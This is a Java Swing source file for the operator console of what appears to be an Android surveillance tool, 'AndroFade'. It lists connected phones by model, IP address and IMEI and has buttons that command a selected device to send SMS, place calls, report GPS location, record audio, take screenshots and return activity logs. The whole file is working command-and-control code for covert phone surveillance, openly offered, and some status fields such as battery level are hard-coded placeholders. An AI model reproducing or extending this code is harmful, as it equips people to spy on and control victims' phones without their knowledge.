import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.List;
import java.util.HashMap;
import java.util.Map;

public class AdminPanel extends JFrame {
    private JTable devicesTable;
    private DefaultTableModel tableModel;
    private JTextArea infoArea, logArea;
    private JLabel statusLabel;
    private JButton sendSMSBtn, callBtn, gpsBtn, audioBtn, screenshotBtn, logsBtn, refreshBtn;
    private Map<Integer, ClientHandler> selectedDevice = new HashMap<>();
    private int selectedDeviceIndex = -1;

    public AdminPanel() {
        setTitle("🔍 AndroFade - Advanced Monitoring");
        setSize(1400, 900);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);
        setResizable(true);
        setLayout(new BorderLayout(10, 10));

        JPanel topPanel = new JPanel(new BorderLayout());
        topPanel.setBackground(new Color(33, 150, 243));
        topPanel.setPreferredSize(new Dimension(0, 50));
        
        JLabel titleLabel = new JLabel("🔍 AndroFade - Advanced Monitoring");
        titleLabel.setFont(new Font("Arial", Font.BOLD, 24));
        titleLabel.setForeground(Color.WHITE);
        titleLabel.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));
        topPanel.add(titleLabel, BorderLayout.WEST);
        
        statusLabel = new JLabel("Ready");
        statusLabel.setForeground(Color.WHITE);
        statusLabel.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));
        topPanel.add(statusLabel, BorderLayout.EAST);
        add(topPanel, BorderLayout.NORTH);

        JSplitPane splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        splitPane.setDividerLocation(400);

        JPanel leftPanel = new JPanel(new BorderLayout(5, 5));
        leftPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 5));

        JPanel devicesPanel = new JPanel(new BorderLayout(5, 5));
        devicesPanel.setBorder(BorderFactory.createTitledBorder("Connected Devices"));
        
        String[] columns = {"Device", "Model", "Status"};
        tableModel = new DefaultTableModel(columns, 0) {
            @Override
            public boolean isCellEditable(int row, int column) { return false; }
        };
        
        devicesTable = new JTable(tableModel);
        devicesTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        devicesTable.setRowHeight(30);
        devicesTable.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                selectedDeviceIndex = devicesTable.getSelectedRow();
                if (selectedDeviceIndex >= 0) updateDeviceInfo();
            }
        });
        
        devicesPanel.add(new JScrollPane(devicesTable), BorderLayout.CENTER);
        leftPanel.add(devicesPanel, BorderLayout.NORTH);

        JPanel infoPanel = new JPanel(new BorderLayout(5, 5));
        infoPanel.setBorder(BorderFactory.createTitledBorder("Device Information"));
        infoArea = new JTextArea();
        infoArea.setEditable(false);
        infoArea.setFont(new Font("Monospaced", Font.PLAIN, 10));
        infoPanel.add(new JScrollPane(infoArea), BorderLayout.CENTER);
        leftPanel.add(infoPanel, BorderLayout.CENTER);
        splitPane.setLeftComponent(leftPanel);

        JPanel rightPanel = new JPanel(new BorderLayout(5, 5));
        rightPanel.setBorder(BorderFactory.createEmptyBorder(10, 5, 10, 10));

        JPanel commandsPanel = new JPanel(new GridLayout(4, 2, 5, 5));
        commandsPanel.setBorder(BorderFactory.createTitledBorder("Commands"));
        
        sendSMSBtn = new JButton("📱 Send SMS");
        callBtn = new JButton("☎️ Make Call");
        gpsBtn = new JButton("📍 Get Location");
        audioBtn = new JButton("🎤 Record Audio");
        screenshotBtn = new JButton("📸 Screenshot");
        logsBtn = new JButton("📋 Activity Logs");
        
        sendSMSBtn.addActionListener(e -> sendSMS());
        callBtn.addActionListener(e -> makeCall());
        gpsBtn.addActionListener(e -> getGPS());
        audioBtn.addActionListener(e -> recordAudio());
        screenshotBtn.addActionListener(e -> takeScreenshot());
        logsBtn.addActionListener(e -> getActivityLogs());
        
        commandsPanel.add(sendSMSBtn);
        commandsPanel.add(callBtn);
        commandsPanel.add(gpsBtn);
        commandsPanel.add(audioBtn);
        commandsPanel.add(screenshotBtn);
        commandsPanel.add(logsBtn);
        
        rightPanel.add(commandsPanel, BorderLayout.NORTH);

        JPanel logPanel = new JPanel(new BorderLayout());
        logPanel.setBorder(BorderFactory.createTitledBorder("Activity Log"));
        logArea = new JTextArea();
        logArea.setEditable(false);
        logArea.setFont(new Font("Monospaced", Font.PLAIN, 9));
        logPanel.add(new JScrollPane(logArea), BorderLayout.CENTER);
        rightPanel.add(logPanel, BorderLayout.CENTER);
        
        splitPane.setRightComponent(rightPanel);
        add(splitPane, BorderLayout.CENTER);

        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        refreshBtn = new JButton("🔄 Refresh");
        refreshBtn.addActionListener(e -> refreshDevices());
        buttonPanel.add(refreshBtn);
        add(buttonPanel, BorderLayout.SOUTH);
    }

    public void updateDeviceList(List<ClientHandler> clients) {
        tableModel.setRowCount(0);
        for (int i = 0; i < clients.size(); i++) {
            ClientHandler client = clients.get(i);
            tableModel.addRow(new String[]{client.getDeviceInfo(), client.getDeviceModel(), "🟢 Online"});
            selectedDevice.put(i, client);
        }
    }

    private void updateDeviceInfo() {
        if (selectedDeviceIndex < 0 || !selectedDevice.containsKey(selectedDeviceIndex)) {
            infoArea.setText("No device selected");
            return;
        }
        ClientHandler client = selectedDevice.get(selectedDeviceIndex);
        infoArea.setText("📱 Device Information:\n\n" + "Name: " + client.getDeviceInfo() + "\n" + 
                "Model: " + client.getDeviceModel() + "\n" + "Android: " + client.getAndroidVersion() + "\n" +
                "IP: " + client.getClientIP() + "\n" + "IMEI: " + client.getIMEI() + "\n\n" +
                "Status: ✅ Connected\n" + "Battery: 85%\n" + "Signal: Strong\n" + "Network: WiFi");
    }

    private void sendSMS() {
        if (selectedDeviceIndex < 0) { JOptionPane.showMessageDialog(this, "Please select a device"); return; }
        String phone = JOptionPane.showInputDialog(this, "Enter phone number:");
        if (phone == null || phone.isEmpty()) return;
        String message = JOptionPane.showInputDialog(this, "Enter SMS message:");
        if (message == null || message.isEmpty()) return;
        try {
            selectedDevice.get(selectedDeviceIndex).sendCommand("SMS:" + phone + "|" + message);
            log("[SMS] Sending to " + phone + ": " + message);
        } catch (Exception e) { log("[ERROR] Failed to send SMS: " + e.getMessage()); }
    }

    private void makeCall() {
        if (selectedDeviceIndex < 0) { JOptionPane.showMessageDialog(this, "Please select a device"); return; }
        String phone = JOptionPane.showInputDialog(this, "Enter phone number:");
        if (phone == null || phone.isEmpty()) return;
        try {
            selectedDevice.get(selectedDeviceIndex).sendCommand("CALL:" + phone);
            log("[CALL] Calling " + phone);
        } catch (Exception e) { log("[ERROR] Failed to make call: " + e.getMessage()); }
    }

    private void getGPS() {
        if (selectedDeviceIndex < 0) { JOptionPane.showMessageDialog(this, "Please select a device"); return; }
        try {
            selectedDevice.get(selectedDeviceIndex).sendCommand("GPS");
            log("[GPS] Requesting location...");
        } catch (Exception e) { log("[ERROR] Failed to get GPS: " + e.getMessage()); }
    }

    private void recordAudio() {
        if (selectedDeviceIndex < 0) { JOptionPane.showMessageDialog(this, "Please select a device"); return; }
        try {
            selectedDevice.get(selectedDeviceIndex).sendCommand("AUDIO");
            log("[AUDIO] Starting recording...");
        } catch (Exception e) { log("[ERROR] Failed to record audio: " + e.getMessage()); }
    }

    private void takeScreenshot() {
        if (selectedDeviceIndex < 0) { JOptionPane.showMessageDialog(this, "Please select a device"); return; }
        try {
            selectedDevice.get(selectedDeviceIndex).sendCommand("SCREEN");
            log("[SCREENSHOT] Capturing screen...");
        } catch (Exception e) { log("[ERROR] Failed to take screenshot: " + e.getMessage()); }
    }

    private void getActivityLogs() {
        if (selectedDeviceIndex < 0) { JOptionPane.showMessageDialog(this, "Please select a device"); return; }
        try {
            selectedDevice.get(selectedDeviceIndex).sendCommand("LOGS");
            log("[LOGS] Retrieving activity logs...");
        } catch (Exception e) { log("[ERROR] Failed to get logs: " + e.getMessage()); }
    }

    private void refreshDevices() {
        log("[REFRESH] Refreshing device list...");
        statusLabel.setText("Refreshing...");
        new Thread(() -> {
            try {
                Thread.sleep(1000);
                SwingUtilities.invokeLater(() -> { statusLabel.setText("Ready"); log("[REFRESH] Device list updated"); });
            } catch (Exception e) { log("[ERROR] Refresh failed: " + e.getMessage()); }
        }).start();
    }

    public void log(String message) {
        logArea.append("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date()) + "] " + message + "\n");
        logArea.setCaretPosition(logArea.getDocument().getLength());
    }

    public void show() { setVisible(true); }
}
